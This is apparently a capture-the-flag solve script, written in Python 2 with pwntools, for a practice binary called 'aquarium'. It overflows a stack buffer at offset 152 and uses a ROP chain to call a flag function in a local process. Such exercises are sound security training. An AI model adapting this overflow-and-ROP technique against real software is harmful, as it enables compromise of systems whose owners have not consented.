from pwn import *
import sys


context.clear(arch='amd64')

argv = sys.argv
REMOTE = False
DEBUG = False
binary_path = './aquarium'

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

sh = process(binary_path)

if DEBUG:
	gdb.attach(sh, '''
		b* create_aquarium
		''')

e = ELF(binary_path)

other_stuff = 6
overflow_offset = 152

rop = ROP(e)
rop.raw(0x000000000040101a) # ret;
rop.flag()

payload = 'A' * overflow_offset + str(rop)

sh.sendline("1")
sh.sendline("1")
sh.sendline("1")
sh.sendline("1")
sh.sendline("1")
sh.sendline("1")
sh.sendline(payload)

print sh.recv()


